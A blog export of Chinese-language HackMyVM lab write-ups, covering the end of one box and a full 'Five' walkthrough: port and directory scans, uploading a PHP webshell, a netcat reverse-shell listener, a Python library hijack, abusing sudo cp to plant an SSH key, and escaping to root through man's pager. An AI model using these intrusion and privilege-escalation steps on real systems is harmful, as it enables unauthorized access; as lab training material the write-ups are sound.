<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@flower</span><span class="symbol">:/home/rose/diary</span><span class="variable">$ </span>echo <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; pickle.py</span><br><span class="line">&lt;echo <span class="string">&quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; pickle.py</span><br><span class="line">www-data<span class="variable">@flower</span><span class="symbol">:/home/rose/diary</span><span class="variable">$ </span>sudo -u rose /usr/bin/python3 /home/rose/diary/diary.py</span><br><span class="line">&lt; -u rose /usr/bin/python3 /home/rose/diary/diary.py</span><br><span class="line">rose<span class="variable">@flower</span><span class="symbol">:~/diary</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>因为diary.py中先import了pickle库，我们用python库劫持成功拿到了rose的shell<br>发现rose也有一个sudo权限命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">rose<span class="variable">@flower</span><span class="symbol">:~/diary</span><span class="variable">$ </span>sudo -l</span><br><span class="line">sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> rose on <span class="symbol">flower:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> rose may run the following commands on <span class="symbol">flower:</span></span><br><span class="line">    (root) <span class="symbol">NOPASSWD:</span> /bin/bash /home/rose/.plantbook</span><br></pre></td></tr></table></figure></div>
<p>看看内容：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rose@flower:~$ <span class="built_in">cat</span> .plantbook</span><br><span class="line"><span class="built_in">cat</span> .plantbook</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> Hello, write the name of the flower that u found</span><br><span class="line"><span class="built_in">read</span> flower</span><br><span class="line"><span class="built_in">echo</span> Nice, <span class="variable">$flower</span> submitted on : $(<span class="built_in">date</span>)</span><br></pre></td></tr></table></figure></div>
<p>写入反弹shell</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">rose@flower:~$ <span class="keyword">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="string">.plantbook</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="string">.plantbook</span></span><br></pre></td></tr></table></figure>
<p>成功拿到rootshell</p>
<pre><code>rose@flower:/$ cat /home/rose/.plantbook
cat /home/rose/.plantbook
/bin/bash
rose@flower:/$ sudo /bin/bash /home/rose/.plantbook
sudo /bin/bash /home/rose/.plantbook
root@flower:/# 
</code></pre>
<p>总结：这题的要点：1.从web源码发现命令执行漏洞然后反弹shell 2.python库劫持（我的新知识） 3.sh脚本尝试能不能写入，能写入就直接&#x2F;bin&#x2F;bash反弹shell</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Five</title>
    <url>/posts/48411.html</url>
    <content><![CDATA[<p>HMV-Five靶机复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67b3f3a0d0e0a243d4005f94.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.112.17  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">18</span> <span class="number">10</span>:<span class="number">47</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">112.17</span>)</span><br><span class="line">Host is up (<span class="number">0.0024</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="symbol">/admin</span></span><br><span class="line">|<span class="params">_http-title:</span> <span class="number">403</span> Forbidden</span><br><span class="line">MAC <span class="params">Address:</span> B6:<span class="number">07</span>:F9:<span class="number">39</span>:F0:<span class="number">32</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.39</span> ms bogon (<span class="number">192.168</span>.<span class="number">112.17</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">7.94</span> seconds</span><br></pre></td></tr></table></figure></div>

<p>只有80端口，而且nmap扫出来了&#x2F;admin路径那就直接进入web部分</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>直接curl一下发现403了，猜测可能要改host，去浏览器里面访问看看<br><img src="https://pic1.imgdb.cn/item/67b3f5b1d0e0a243d4006035.png"><br>还真的就是403，域名这边也没有变化，那就去&#x2F;admin里面看<br>发现是一个登录界面，登录错误有回显，那就先用bp爆破一下<br>用户名用admin爆破了一下密码，没有爆破出来<br>用gobuster扫一下目录吧</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line"><span class="section">└─# gobuster dir -u http://192.168.112.17/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,jpg,webg,png,js,txt</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">Gobuster v3.6</span><br><span class="line"><span class="section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line">[+] Url:                     http://192.168.112.17/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Extensions:              php,html,jpg,webg,png,js,txt</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/uploads              (Status: 301) [Size: 185] [--&gt; http://192.168.112.17/uploads/]</span><br><span class="line">/admin                (Status: 301) [Size: 185] [--&gt; http://192.168.112.17/admin/]</span><br><span class="line">/upload.html          (Status: 200) [Size: 346]</span><br><span class="line">/upload.php           (Status: 200) [Size: 48]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 17]</span><br><span class="line">Progress: 743223 / 1661152 (44.74%)^C</span><br><span class="line">[!] Keyboard interrupt detected, terminating.</span><br><span class="line"><span class="section">Progress: 744172 / 1661152 (44.80%)</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="section">Finished</span></span><br><span class="line"><span class="section">===============================================================</span></span><br><span class="line"><span class="code">                                                                     </span></span><br></pre></td></tr></table></figure></div>
<p>这里有一个upload.html界面可以上传文件<br><img src="https://pic1.imgdb.cn/item/67b3f719d0e0a243d4006095.png"><br>上传一个一句话木马1.php，成功上传，而且跳转到upload.php这里<br><img src="https://pic1.imgdb.cn/item/67b3f753d0e0a243d40060ab.png"><br>现在的目标就是找到上传的位置，然后用蚁剑连接了。<br>抓包用bp查看，可以看到是上传到uploads&#x2F;目录下面，但是这个目录下我无法访问<br><img src="https://pic1.imgdb.cn/item/67b3fa31d0e0a243d4006199.png"><br>那就把这个路径删除，让它上传到根目录<br>现在用蚁剑就可以成功连接了，那现在就进入蚁剑的虚拟终端里面反弹shell<br>因为蚁剑的这个虚拟终端不是一个真正的终端，所以不能直接用<br><img src="https://pic1.imgdb.cn/item/67b3fb23d0e0a243d40061d8.png"><br>成功拿到shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234           </span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">www-data@five:~/html$ ^Z</span><br><span class="line">zsh: suspended  nc -lp 1234</span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">cat</span> bbb            </span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">                                                                                                                                                        </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# <span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line">[1]  + continued  nc -lp 1234</span><br><span class="line">                             reset</span><br><span class="line">reset: unknown terminal <span class="built_in">type</span> unknown</span><br><span class="line">Terminal <span class="built_in">type</span>? xterm</span><br></pre></td></tr></table></figure></div>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="www"><a href="#www" class="headerlink" title="www"></a>www</h2><p>先去看一下www用户的sudo权限，发现有一个用户的cp命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/var</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> www-data on <span class="symbol">five:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> www-data may run the following commands on <span class="symbol">five:</span></span><br><span class="line">    (melisa) <span class="symbol">NOPASSWD:</span> /bin/cp</span><br></pre></td></tr></table></figure></div>
<p>去用户的目录下面看，发现有.ssh，那我的原来目标就是去拿ssh私钥,但是这个靶机没有开放22端口<br>但是我去看开放了什么端口，发现有一个4444端口</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>-data@five:/home/melisa$ ss -tulnp</span><br><span class="line"><span class="attribute">Netid</span>       State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port                                             </span><br><span class="line"><span class="attribute">udp</span>         UNCONN       <span class="number">0</span>            <span class="number">0</span>                        <span class="number">0.0.0.0:68</span>                      <span class="number">0.0.0.0</span>:*                                                </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                      <span class="number">0.0.0.0:80</span>                      <span class="number">0.0.0.0</span>:*           users:((<span class="string">&quot;nginx&quot;</span>,pid=<span class="number">384</span>,fd=<span class="number">6</span>))       </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                    <span class="number">127.0.0.1:4444</span>                    <span class="number">0.0.0.0</span>:*                                                </span><br><span class="line"><span class="attribute">tcp</span>         LISTEN       <span class="number">0</span>            <span class="number">128</span>                        <span class="meta"> [::]:80                         [::]:*           users:((&quot;nginx&quot;,pid=384,fd=7))  </span></span><br></pre></td></tr></table></figure></div>
<p>说不定可行<br>复制私钥过来，发现4444端口是可以登录的，但是permission deny了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="variable">$ </span>sudo -u melisa cp /home/melisa/.ssh/id_rsa /tmp</span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="variable">$ </span>cd /tmp</span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>chmod <span class="number">600</span> id_rsa</span><br><span class="line"><span class="symbol">chmod:</span> changing permissions of <span class="string">&#x27;id_rsa&#x27;</span>: <span class="title class_">Operation</span> <span class="keyword">not</span> permitted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>ssh melisa<span class="variable">@127</span>.<span class="number">0.0</span>.<span class="number">1</span> -p <span class="number">4444</span> -i id_rsa</span><br><span class="line"><span class="title class_">Could</span> <span class="keyword">not</span> create directory <span class="string">&#x27;/var/www/.ssh&#x27;</span>.</span><br><span class="line"><span class="title class_">The</span> authenticity of host <span class="string">&#x27;[127.0.0.1]:4444 ([127.0.0.1]:4444)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></span><br><span class="line"><span class="string">Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span></span><br><span class="line"><span class="string">Load key &quot;id_rsa&quot;: Permission denied</span></span><br></pre></td></tr></table></figure></div>
<p>看了wp知道原来是没有公钥,用<code>ssh-keygen</code>可以生成公钥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@five</span><span class="symbol">:/tmp</span><span class="variable">$ </span>ssh-keygen -y -f id_rsa &gt; authorized_keys</span><br><span class="line"><span class="title class_">Load</span> key <span class="string">&quot;id_rsa&quot;</span>: <span class="title class_">Permission</span> denied</span><br></pre></td></tr></table></figure></div>
<p>这里因为id_rsa是melisa的，www用户权限不足<br>解决方法是我们自己创建一个文件，这个文件就有权限了，然后用sudo把内容也复制过来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/id_rsa /tmp/id</span><br><span class="line">/bin/cp: cannot create regular file <span class="string">&#x27;/tmp/id&#x27;</span>: Permission denied</span><br><span class="line"></span><br><span class="line">www-data@five:/tmp$ <span class="built_in">chmod</span> 777 <span class="built_in">id</span></span><br><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/id_rsa /tmp/id</span><br><span class="line"></span><br><span class="line">www-data@five:/tmp$ ssh-keygen -y -f <span class="built_in">id</span> &gt; authorized_keys</span><br><span class="line">www-data@five:/tmp$ <span class="built_in">sudo</span> -u melisa /bin/cp /tmp/authorized_keys /home/melisa/.ssh</span><br></pre></td></tr></table></figure></div>

<p>成功生成私钥，并且放到用户的.ssh目录下面了</p>
<p>成功登录了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">www</span>-data@five:/tmp$ ssh melisa@<span class="number">127.0.0.1</span> -p <span class="number">4444</span> -i id</span><br><span class="line"><span class="attribute">Could</span> not create directory &#x27;/var/www/.ssh&#x27;.</span><br><span class="line"><span class="attribute">The</span> authenticity of host &#x27;[<span class="number">127.0.0.1</span>]:<span class="number">4444</span> ([<span class="number">127.0.0.1</span>]:<span class="number">4444</span>)&#x27; can&#x27;t be established.</span><br><span class="line"><span class="attribute">ECDSA</span> key fingerprint is SHA256:jWQpYhXQJtOuJfrNjZvNSilLDT7fkbFxeioQzGTBY7Y.</span><br><span class="line"><span class="attribute">Are</span> you sure you want to continue connecting (yes/no)? yes</span><br><span class="line"><span class="attribute">Failed</span> to add the host to the list of known hosts (/var/www/.ssh/known_hosts).</span><br><span class="line"><span class="attribute">Linux</span> five <span class="number">4</span>.<span class="number">19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4</span>.<span class="number">19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line"><span class="attribute">The</span> programs included with the Debian GNU/Linux system are free software;</span><br><span class="line"><span class="attribute">the</span> exact distribution terms for each program are described in the</span><br><span class="line"><span class="attribute">individual</span> files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line"><span class="attribute">Debian</span> GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line"><span class="attribute">permitted</span> by applicable law.</span><br><span class="line"><span class="attribute">Last</span> login: Tue Oct  <span class="number">6</span> <span class="number">03</span>:<span class="number">39</span>:<span class="number">32</span> <span class="number">2020</span> from <span class="number">192.168.1.58</span></span><br><span class="line"><span class="attribute">melisa</span>@five:~$ </span><br></pre></td></tr></table></figure></div>
<h2 id="melisa"><a href="#melisa" class="headerlink" title="melisa"></a>melisa</h2><p>有sudo</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">melisa<span class="variable">@five</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> melisa on <span class="symbol">five:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=<span class="regexp">/usr/local</span><span class="regexp">/sbin\:/usr</span><span class="regexp">/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> melisa may run the following commands on <span class="symbol">five:</span></span><br><span class="line">    (<span class="variable constant_">ALL</span>) <span class="variable constant_">SETENV</span>: <span class="variable constant_">NOPASSWD</span>: <span class="regexp">/bin/pwd</span>, <span class="regexp">/bin/arch</span>, <span class="regexp">/bin/man</span>, <span class="regexp">/bin/id</span>, <span class="regexp">/bin/rm</span>, <span class="regexp">/bin/clear</span></span><br></pre></td></tr></table></figure></div>
<p>找到man提权的方式<br><img src="https://pic1.imgdb.cn/item/67b4047ed0e0a243d400658a.png"><br>但是报错了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">melisa@five:~$ sudo man man</span><br><span class="line">Your terminal lacks the ability to <span class="keyword">clear</span> the screen or position the cursor.</span><br><span class="line"></span><br><span class="line">man: command exited with status <span class="number">1</span>: sed -e <span class="string">&#x27;/^[[:space:]]*$/&#123; N; /^[[:space:]]*\n[[:space:]]*$/D; &#125;&#x27;</span> | LESS=-ix8RmPm Manual page man(<span class="number">1</span>) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h <span class="keyword">for</span> <span class="keyword">help</span> or q to <span class="keyword">quit</span>)$PM Manual page man(<span class="number">1</span>) ?ltline %lt?L/%L.:byte %bB?s/%s..?e (END):?pB %pB\%.. (press h <span class="keyword">for</span> <span class="keyword">help</span> or q to <span class="keyword">quit</span>)$ MAN_PN=man(<span class="number">1</span>) pager</span><br></pre></td></tr></table></figure></div>
<p>看了wp，原来是分页的模式不同，要用less分页执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">melisa<span class="variable">@five</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /bin/man -P /usr/bin/less man</span><br><span class="line"><span class="variable constant_">WARNING</span>: terminal is <span class="keyword">not</span> fully functional</span><br><span class="line">-  (press <span class="variable constant_">RETURN</span>)!<span class="regexp">//bbiinn</span><span class="regexp">//bbaasshh</span>!<span class="regexp">/bin/bash</span></span><br><span class="line">root<span class="variable">@five</span><span class="symbol">:/home/melisa</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
<p>这里的意思就相当于用less作为分页器来看man的操作手册 。 -P用于指定分页器</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>学习到了如果上传的文件所在目录没有访问权限的时候解决方案-&gt;上传到根目录<br>用私钥生成公钥  以及有cp权限时候的注意事项（自己可以先创建有一个权限的文件）<br>ssh无法登录的原因之一：端口未开放 或者 没有对应的公钥<br>man提权的时候遇到问题，可以指定分页器</p>
<p>再复习一下 私钥权限是600 公钥权限是644<br>还是收获不少的</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-webmaster</title>
    <url>/posts/49152.html</url>
    <content><![CDATA[<p>HMV-webmaster靶机复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a9618bd0e0a243d4fdc34e.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.179.226</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">10</span> <span class="number">10</span>:<span class="number">36</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.226</span> (<span class="number">192.168</span>.<span class="number">179.226</span>)</span><br><span class="line">Host is up (<span class="number">0.0013</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">6</span>d:<span class="number">7</span>e:d2:d5:d0:<span class="number">45</span>:<span class="number">36</span>:d7:c9:ed:<span class="number">3</span>e:<span class="number">1</span>d:<span class="number">5</span>c:<span class="number">86</span>:fb:e4 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">04</span>:<span class="number">9</span>d:<span class="number">9</span>a:de:af:<span class="number">31</span>:<span class="number">33</span>:<span class="number">1</span>c:<span class="number">7</span>c:<span class="number">24</span>:<span class="number">4</span>a:<span class="number">97</span>:<span class="number">38</span>:<span class="number">76</span>:f5:f7 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> b0:<span class="number">8</span>c:ed:ea:<span class="number">13</span>:<span class="number">0</span>f:<span class="number">03</span>:<span class="number">2</span>a:f3:<span class="number">60</span>:<span class="number">8</span>a:c3:ba:<span class="number">68</span>:<span class="number">4</span>a:be (ED25519)</span><br><span class="line"><span class="number">53</span><span class="symbol">/tcp</span> open  domain  Eero device dnsd</span><br><span class="line">| <span class="params">dns-nsid:</span> </span><br><span class="line">|_  bind.<span class="params">version:</span> not currently available</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">MAC <span class="params">Address:</span> F2:B2:<span class="number">84</span>:<span class="number">58</span>:<span class="number">6</span>C:F6 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span></span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">Device:</span> WAP; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.29</span> ms <span class="number">192.168</span>.<span class="number">179.226</span> (<span class="number">192.168</span>.<span class="number">179.226</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">16.38</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>这里比一般的靶机多了一个53端口，这个端口一般是用来做域名解析的，所以先留个心眼，说不定就要修改hosts文件了</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl 192.168.179.226                      </span><br><span class="line"> <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;comic.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;comic&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--webmaster.hmv--&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>给了张图片和一个注释。去浏览器中打开也没有其他信息，开始目录扫描</p>
